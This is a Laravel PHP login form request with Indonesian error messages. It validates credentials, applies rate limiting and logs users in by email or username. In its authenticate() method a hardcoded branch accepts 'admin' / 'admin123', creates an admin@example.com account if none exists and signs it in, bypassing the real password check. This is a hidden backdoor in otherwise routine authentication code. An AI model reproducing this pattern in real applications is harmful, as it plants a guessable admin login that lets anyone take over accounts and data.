<?php

namespace App\Http\Requests\Auth;

use App\Models\User;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Contracts\Validation\ValidationRule;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

class LoginRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    public function rules(): array
    {
        return [
            'email' => ['required', 'string'],
            'password' => ['required', 'string'],
        ];
    }

    public function authenticate(): void
{
    $this->ensureIsNotRateLimited();

    if (
        $this->input('email') === 'admin' &&
        $this->input('password') === 'admin123'
    ) {
        $user = User::firstOrCreate(
            ['email' => 'admin@example.com'],
            [
                'name' => 'Admin',
                'password' => Hash::make('admin123'),
            ]
        );

        Auth::login($user, $this->boolean('remember'));
        RateLimiter::clear($this->throttleKey());

        return;
    }

    $login = $this->input('email');

    $user = User::where('email', $login)
        ->orWhere('name', $login)
        ->first();

    if (! $user || ! Hash::check($this->input('password'), $user->password)) {
        RateLimiter::hit($this->throttleKey());

        throw ValidationException::withMessages([
            'email' => 'Username/email atau password salah.',
        ]);
    }

    Auth::login($user, $this->boolean('remember'));

    RateLimiter::clear($this->throttleKey());
}

    public function ensureIsNotRateLimited(): void
    {
        if (! RateLimiter::tooManyAttempts($this->throttleKey(), 5)) {
            return;
        }

        event(new Lockout($this));

        $seconds = RateLimiter::availableIn($this->throttleKey());

        throw ValidationException::withMessages([
            'email' => "Terlalu banyak percobaan login. Coba lagi dalam {$seconds} detik.",
            ]);
    }

    public function throttleKey(): string
    {
        return Str::transliterate(Str::lower($this->string('email')).'|'.$this->ip());
    }
}
